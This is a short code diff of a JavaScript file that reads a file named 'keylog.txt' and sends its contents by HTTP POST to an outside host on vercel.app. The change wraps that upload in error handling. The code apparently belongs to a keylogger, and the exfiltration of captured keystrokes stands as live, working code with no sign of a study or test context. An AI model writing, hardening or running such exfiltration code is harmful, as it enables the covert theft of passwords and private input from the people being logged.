@@ -12,8 +12,13 @@ fs.readFile('./../keylog.txt', 'utf8', async(err, data) => {
     d = data
     console.log(d)
 
-    await axios.post("https://aws-server-omega.vercel.app/",{
-        d
-    })
+    try {
+        await axios.post("https://aws-server-omega.vercel.app/",{
+            d
+        })
+        }
+    catch (error) {
+        console.log(error.message)
+    }
     
 })
